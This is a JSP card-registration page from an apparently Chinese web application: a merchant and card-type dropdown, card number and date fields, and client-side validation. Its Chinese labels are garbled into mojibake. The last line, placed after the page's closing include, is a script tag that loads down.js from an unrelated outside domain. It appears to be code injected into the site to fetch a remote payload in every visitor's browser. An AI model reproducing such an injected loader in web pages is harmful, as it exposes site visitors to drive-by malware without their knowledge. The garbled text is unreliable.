<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="��������-�ҿ�"/> 
<%@ include file="IncludeTop.jsp" %>
<script language="javascript">
<!--
function listMetaCards(form)
{
  form.metaCard.options[0].value = 0;
  form.metaCard.options[0] = new Option("��ѡ��...","");
  form.metaCard.options.length = 1;

  var merchantNo = form.merchant.options[form.merchant.selectedIndex].value;
  switch(merchantNo){
  <c:forEach var="metaCardMerchant" items="${applicationScope.appData.metaCardMerchants}"> 
        <c:set var="shift" value="0"/> 
		case '<c:out value="${metaCardMerchant.merchantNo}"/>':   //<c:out value="${metaCardMerchant.merchantName}"/>		         
           	    <c:forEach var="metaCard" items="${metaCardMerchant.metaCards}" varStatus="status"> 
					<c:if test="${status.first and !status.last}">
						form.metaCard.options[0]=new Option("��ѡ��...","");
						<c:set var="shift" value="1"/> 
					</c:if>
					form.metaCard.options[<c:out value="${status.index+shift}"/>]=new Option('<c:out value="${metaCard.cardName}"/>','<c:out value="${metaCard.cardCategory}"/>');		
				</c:forEach>
		        break;
   </c:forEach>	  
  default:
	form.metaCard.options[0]=new Option("��ѡ��...","");
	break; 	
  }  
  form.metaCard.options[0].selected=true;
}


function checkAll(){
	if(
	   validate(document.registerCardForm.metaCard, '����', 'public', 0, 32, false)&&
   	   validate(document.registerCardForm.cardNo, '����', 'public', 0, 32, false)&&
	   validate(document.registerCardForm.publishDate, '��������', 'date', 0, 10, true) ){	       
	   	    return true;
	   }
   return false;
}

//-->
</script>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td background="images/left_border.gif" width="10"></td>
    <td width="198" valign="top"> 
      <%@ include file="accountBar.jsp" %>
      <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>
    </td>
    <td width="562" bgcolor="#FFFFFF" valign="top">
	  <c:if test="${empty userSession}">
	     <table  width="100%" height="61" border="0" cellpadding="0" cellspacing="0">
			<tr > 
			  <td align="center" colspan="4">����û�е�½��</td>
			</tr>
		</table>
	  </c:if >	
	  <c:if test="${!empty userSession}"> 	  
      <form name="registerCardForm" method="post" action='<c:url value="/registerCard.do"/>' onSubmit="return checkAll();">
        <table width="100%" border="0">
          <tr> 
            <td align="center" height="32" width="20%">* </td>
            <td align="center" height="32" width="18%">�֡�����</td>
            <td align="left" height="32" width="44%"> 
              <select onChange="listMetaCards(document.registerCardForm)" size="1" name="merchant">
                <option value="" selected>��ѡ��...</option>
                <c:forEach var="metaCardMerchant" items="${applicationScope.appData.metaCardMerchants}"> 
                <option value='<c:out value="${metaCardMerchant.merchantNo}"/>'><c:out value="${metaCardMerchant.merchantName}"/></option>
                </c:forEach> 
              </select>
              <select  size="1" name="metaCard">
                <option value="" selected>��ѡ��...</option>
              </select>
            </td>
            <td align="center" height="32" width="18%">&nbsp;</td>
          </tr>
          <tr>
            <td align="center" height="32" width="20%">*</td>
            <td align="center" height="32" width="18%">��������</td>
            <td align="left" height="32" width="44%">
              <input type="text" name="cardNo" maxlength="32" size="32">
            </td>
            <td align="center" height="32" width="18%">&nbsp;</td>
          </tr>
          <tr>
            <td align="center" height="32" width="20%">&nbsp;</td>
            <td align="center" height="32" width="18%">��������</td>
            <td align="left" height="32" width="44%">
              <input type="text" name="publishDate" maxlength="10" size="10">
            </td>
            <td align="center" height="32" width="18%">&nbsp;</td>
          </tr>
          <tr>
            <td align="center" height="32" width="20%">&nbsp; </td>
            <td align="center" height="32" width="18%"> 
              <input type="submit" value="ȷ ��" class="medium" name="�ύ">
            </td>
            <td align="center" height="32" width="44%"> 
              <input type="reset" value="�� ��" class="medium" name="����">
            </td>
            <td align="center" height="32" width="18%">&nbsp;</td>
          </tr>
        </table>      
	  </form>
	  </c:if > 
    <td width="10" bgcolor="#FFFFFF" valign="top" background="images/right_border.gif">&nbsp;</td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>